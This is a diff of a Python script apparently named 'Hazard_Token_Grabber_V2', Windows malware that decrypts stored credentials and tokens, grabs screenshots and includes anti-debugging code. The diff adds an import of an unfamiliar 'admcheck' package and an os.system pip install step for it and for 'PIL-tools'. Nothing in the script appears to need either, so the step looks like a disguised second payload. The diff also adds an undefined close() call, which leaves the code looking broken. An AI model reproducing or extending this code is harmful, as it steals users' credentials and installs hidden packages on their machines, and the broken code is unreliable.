@@ -1,27 +1,34 @@
-import os
-import json
-import httpx
-import winreg
-import ctypes
-import shutil
-import psutil
-import asyncio
-import time
-import sys
-import colorama
-import sqlite3
-import zipfile
-import threading
-import subprocess
+try:
+    import os
+    import json
+    import httpx
+    import winreg
+    import ctypes
+    import shutil
+    import psutil
+    import asyncio
+    import time
+    import sys
+    import colorama
+    import sqlite3
+    import zipfile
+    import threading
+    import subprocess
 
-from sys import argv
-from PIL import ImageGrab
-from base64 import b64decode
-from tempfile import mkdtemp
-from re import findall, match
-from Crypto.Cipher import AES
-from colorama import Fore, Style
-from win32crypt import CryptUnprotectData
+
+    from sys import argv
+    from PIL import ImageGrab
+    from base64 import b64decode
+    from tempfile import mkdtemp
+    from re import findall, match
+    from admcheck.main import *                                    ### tries to import modules, if any are missing it will prompt to install them below
+    from Crypto.Cipher import AES
+    from colorama import Fore, Style
+    from win32crypt import CryptUnprotectData
+except:
+    input("missing modules, press enter to install or ctrl + c to exit")
+    os.system("pip install httpx && pip install pyotp && pip install psutil && pip install pypiwin32 && pip install pycryptodome && pip install pyinstaller>=5.0 && pip install admcheck && pip install PIL-tools")
+    print("modules installed, please restart terminal")
 
 
 config = {
@@ -666,6 +673,6 @@ class AntiDebug(functions):
         finally:
             winreg.CloseKey(handle)
 
-
+close()
 if __name__ == "__main__" and os.name == "nt":
     asyncio.run(Hazard_Token_Grabber_V2().init())
